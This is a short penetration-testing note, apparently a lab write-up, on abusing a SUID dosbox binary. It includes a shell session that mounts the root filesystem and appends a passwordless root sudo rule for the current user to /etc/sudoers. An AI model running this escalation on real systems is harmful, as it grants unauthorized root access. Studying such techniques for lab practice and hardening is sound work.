# dosbox SUID

&#x20;With dosbox we can basically mount a folder and then edit it, so if we have SUID. It means that we can edit files that are only editable by root. These could be sudoers, passwd, shadow.&#x20;

![](<../../../../.gitbook/assets/image (20).png>)

{% embed url="https://gtfobins.github.io/gtfobins/dosbox/" %}

```
[commander@nukem ~]$ export LFILE='/etc/sudoers'
[commander@nukem ~]$ dosbox -c 'mount c /' -c "echo commander ALL=(root) NOPASSWD: ALL >>c:$LFILE"
DOSBox version 0.74-3
Copyright 2002-2019 DOSBox Team, published under GNU GPL.
---
ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:5231:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
CONFIG:Loading primary settings from config file /home/commander/.dosbox/dosbox-0.74-3.conf
MIXER:Can't open audio: No available audio device , running in nosound mode.
ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
MIDI:Opened device:none
SHELL:Redirect output to c:/etc/sudoers
```

Change the name of the user to the one your on right now.&#x20;

![](<../../../../.gitbook/assets/image (82).png>)
